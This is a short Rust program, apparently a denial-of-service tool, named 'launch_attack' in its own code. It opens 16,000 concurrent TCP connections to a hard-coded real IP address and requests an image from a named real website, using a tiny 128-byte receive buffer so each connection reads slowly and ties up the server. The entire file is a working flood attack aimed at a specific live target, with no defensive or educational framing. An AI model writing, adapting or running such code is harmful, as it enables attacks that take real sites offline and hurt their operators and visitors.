extern crate futures;
extern crate http;
extern crate tokio;

use futures::future::join_all;
use futures::prelude::*;
use http::Request;
use std::net::SocketAddr;
use tokio::io;
use tokio::io::Error;
use tokio::net::TcpStream;

fn main() {
    let mut futures = vec![];

    for _ in 0..16000 {
        futures.push(launch_attack());
    }

    join_all(futures).wait();
}

fn launch_attack() -> impl Future<Item=(), Error=Error> {
    let socket_addr: SocketAddr = "94.46.135.151:80".parse().unwrap();
    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();

    tcp_stream.set_recv_buffer_size(128usize);

    let request = Request::get("http://up.ieee-pt.org/assets/images/header.jpg").body(()).unwrap();
    let request = build_http_request(&request);

    io::write_all(&tcp_stream, request).wait();

    let buf = vec![];

    io::read_to_end(tcp_stream, buf)
        .then(|_result| {
            Ok(())
        })
}

fn build_http_request(request: &Request<()>) -> String {
    let mut req_str = String::new();

    req_str.push_str(request.method().as_str());
    req_str.push_str(" ");
    req_str.push_str(request.uri().path_and_query().unwrap().as_str());
    req_str.push_str(" HTTP/1.1\r\n");

    req_str.push_str("Host: ");
    req_str.push_str(request.uri().host().unwrap());
    req_str.push_str("\r\nUser-Agent: rust\r\n");
    req_str.push_str("Accept: */*\r\n");

    req_str.push_str("\r\n");

    req_str
}